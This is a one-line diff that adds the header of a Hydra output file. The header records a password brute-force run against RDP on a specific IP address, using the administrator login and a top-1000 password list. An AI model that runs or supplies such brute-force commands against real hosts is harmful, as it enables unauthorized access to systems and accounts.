@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 09:38:58 on 8.129.115.103 rdp (hydra -l administrator -P /tmp/top1000.txt -t 2 -w 3 -o /tmp/ljrdp2.txt rdp://8.129.115.103)
